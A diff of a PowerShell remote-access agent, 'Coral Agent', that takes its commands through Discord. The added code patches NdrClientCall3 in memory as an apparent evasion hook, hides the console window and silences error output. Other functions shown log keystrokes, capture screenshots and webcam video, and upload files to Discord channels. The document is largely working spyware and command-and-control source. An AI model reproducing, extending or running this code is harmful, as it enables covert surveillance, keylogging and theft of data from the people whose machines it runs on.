@@ -1,7 +1,76 @@
 #global vars
 $global:token = $token
 $script:Jobs = @{}
+$global:hidewindow = $false
+$global:keyloggerstatus = $false
+# ghost ---
+function ghost{
+    Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
 
+public class Mem {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+}
+"@
+
+# Constants
+$PAGE_EXECUTE_READWRITE = 0x40
+$MEM_COMMIT = 0x1000
+$MEM_RESERVE = 0x2000
+$PATCH_SIZE = 12
+
+# Allocate trampoline: mov eax, 0; ret
+$size = [UIntPtr]::op_Explicit(0x1000)
+$trampoline = [Mem]::VirtualAlloc([IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
+
+# Exit if trampoline allocation failed
+if ($trampoline -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to allocate trampoline."
+    return
+}
+
+# Write hook: mov eax, 0; ret
+$hook = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($hook, 0, $trampoline, $hook.Length)
+
+# Flush instruction cache
+$len = [UIntPtr]::op_Explicit($hook.Length)
+[Mem]::FlushInstructionCache([Mem]::GetCurrentProcess(), $trampoline, $len) | Out-Null
+
+# Get function address
+$lib = [Mem]::LoadLibrary("rpcrt4.dll")
+$func = [Mem]::GetProcAddress($lib, "NdrClientCall3")
+if ($func -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to locate NdrClientCall3."
+    return
+}
+
+# Unprotect target memory
+$oldProtect = 0
+[Mem]::VirtualProtect($func, [UIntPtr]::op_Explicit($PATCH_SIZE), $PAGE_EXECUTE_READWRITE, [ref]$oldProtect) | Out-Null
+
+# Write patch: mov rax, trampoline; jmp rax
+$trampAddr = $trampoline.ToInt64()
+$patch = [byte[]](0x48, 0xB8) + [BitConverter]::GetBytes($trampAddr) + [byte[]](0xFF, 0xE0)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, $patch.Length)
+}
 
 # =============================================================== CORE DISCORD FUNCTIONS =========================================================================
 
@@ -118,7 +187,7 @@ function sendMsg {
         try {
             $response = $wc.UploadString($url, "POST", $jsonBody)
         } catch {
-            Write-Host "Error sending embed: $($_.Exception.Message)"
+            #Write-Host "Error sending embed: $($_.Exception.Message)"
         }
         $jsonPayload = $null
     }
@@ -161,9 +230,9 @@ function Send_SingleMessage {
     
     try {
         $response = $wc.UploadString($url, "POST", $jsonBody)
-        write-host "Message sent successfully"
+        #write-host "Message sent successfully"
     } catch {
-        Write-Host "Error sending message: $($_.Exception.Message)"
+        #Write-Host "Error sending message: $($_.Exception.Message)"
         
         # Fallback with heavy sanitization
         try {
@@ -173,9 +242,9 @@ function Send_SingleMessage {
             }
             $fallbackJson = @{ "content" = $fallbackMessage } | ConvertTo-Json -Compress
             $response = $wc.UploadString($url, "POST", $fallbackJson)
-            Write-Host "Message sent with fallback sanitization"
+            #Write-Host "Message sent with fallback sanitization"
         } catch {
-            Write-Host "Fallback also failed: $($_.Exception.Message)"
+            #Write-Host "Fallback also failed: $($_.Exception.Message)"
         }
     }
 }
@@ -240,7 +309,7 @@ function Send_AsFile {
             Send_SingleMessage -Content "``````$truncated``````"
         }
     } catch {
-        Write-Host "Error creating temp file: $($_.Exception.Message)"
+        #Write-Host "Error creating temp file: $($_.Exception.Message)"
         # Fallback to chunking
         Send_ChunkedMessage -Content $Content
     }
@@ -325,14 +394,13 @@ function sendFile {
     if ($sendfilePath) {
         if (Test-Path $sendfilePath -PathType Leaf) {
             $response = $webClient.UploadFile($url, "POST", $sendfilePath)
-            Write-Host "Attachment sent to Discord: $sendfilePath"
+            #Write-Host "Attachment sent to Discord: $sendfilePath"
         } else {
-            Write-Host "File not found: $sendfilePath"
+            #Write-Host "File not found: $sendfilePath"
         }
     }
 }
 
-# Pull messages from Discord channel function
 Function PullMsg {
     $headers = @{
         'Authorization' = "Bot $token"
@@ -346,9 +414,24 @@ Function PullMsg {
         return $most_recent_message.content
     }
 }
-# ======================================================== key logger =================================
 
-$global:keyloggerstatus = $false
+# hide window ---
+function HideWindow {
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+    if($hwnd -ne [System.IntPtr]::Zero){
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+    else{
+        $Host.UI.RawUI.WindowTitle = 'hideme'
+        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+}
+# key logger ---
+
 
 function keylogger {
     param (
@@ -423,10 +506,10 @@ function keylogger {
                     $errorMsg = $_.Exception.Message
                     
                     if ($errorMsg -match "429" -or $errorMsg -match "Too Many Requests") {
-                        Write-Host "Rate limited, waiting before retry $retryCount/$maxRetries..."
+                        #Write-Host "Rate limited, waiting before retry $retryCount/$maxRetries..."
                         Start-Sleep -Seconds (5 * $retryCount)
                     } else {
-                        Write-Host "Error setting up keylog channel: $errorMsg"
+                        #Write-Host "Error setting up keylog channel: $errorMsg"
                         if ($retryCount -eq $maxRetries) {
                             $keylogChannelID = $originalSessionID
                             sendMsg -Message ":warning: **Could not create keylog channel, using main channel**"
@@ -561,7 +644,7 @@ function keylogger {
                     
                     $global:SessionID = $tempSessionID
                 } catch {
-                    Write-Host "Failed to send keylog data: $($_.Exception.Message)"
+                    #Write-Host "Failed to send keylog data: $($_.Exception.Message)"
                 }
             }
 
@@ -651,7 +734,7 @@ function Get_KeyloggerStatus {
 
 
 
-
+# SS ---
 function screenshot_all {
     try {
         Add-Type -AssemblyName System.Windows.Forms
@@ -736,7 +819,7 @@ function screenshot_all {
         sendMsg -Message ":x: **Multi-monitor screenshot error:** $($_.Exception.Message)"
     }
 }
-# ================================================================ WEBCAM =========
+# Webcam ---
 function Webcam {
     param(
         [int]$durationSeconds = 1,
@@ -832,9 +915,7 @@ function Webcam {
         sendMsg -Message ":x: **No webcam or audio devices found**"    
     }
 }
-# =============================================================== JOBS ================================
-
-
+# JOB ---
 function Start_AgentJob {
     param($ScriptString)
     $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
@@ -853,7 +934,7 @@ function Get_AgentJobCompleted {
 
 
 # List all current jobs with their status
-function List_AgentJobs {
+function List_Jobs {
     $jobList = @()
     foreach ($JobName in $script:Jobs.Keys) {
         $job = $script:Jobs[$JobName]
@@ -1030,19 +1111,24 @@ if (!(CheckCategoryExists)) {
 } else {
     $global:SessionID = $ChannelID
 }
-
+# hide window?
+if ($global:hidewindow) {
+    HideWindow
+}
 
 # Send initial connection message
 sendMsg -Message "``$env:COMPUTERNAME connected to Coral Network``"
+ghost
 
 # =============================================================== HELP MENU ========================================================================
 function display_help{
     $message = "
-**Coral Agent Help Menu:**
+:robot: **Coral Agent Help Menu:**
 
 **Basic Commands:**
 - **TEST:** Test the connection to the Coral Network
 - **INFO:** Get information about the local machine
+- **HELP:** Display this help menu
 - **EXIT:** Disconnect from the Coral Network
 
 **Job Management:**
@@ -1053,14 +1139,21 @@ function display_help{
 - **JOBSTATUS <jobname>:** Get detailed status of a job
 - **STOPALLJOBS:** Stop all running jobs
 
-**Examples:**
-- ``CREATEJOB Get-Process`` - Monitor running processes
-- ``CREATEJOB Get-Date`` - Get current date/time
-- ``JOBOUTPUT ABC123`` - View output from job ABC123
-- ``DELETEJOB ABC123`` - Remove job ABC123
+**Keylogger Commands:**
+- **STARTKEYLOG:** Start keylogger with default 30-second intervals
+- **STARTKEYLOG <seconds>:** Start keylogger with custom interval (1-300 seconds)
+- **STOPKEYLOG:** Stop the keylogger
+- **KEYLOGSTATUS:** Check keylogger status
 
-**Direct Commands:**
-Any other message will be executed as a PowerShell command directly.
+**Webcam Commands:**
+- **WEBCAM:** Record 1 second of webcam video
+
+**Screenshot Commands:**
+- **SCREENSHOTALL:** Take screenshots of all monitors
+
+**File Operations:**
+- **SENDFILE <filepath>:** Upload a file to Discord
+
 "
     sendMsg -Message $message
 }
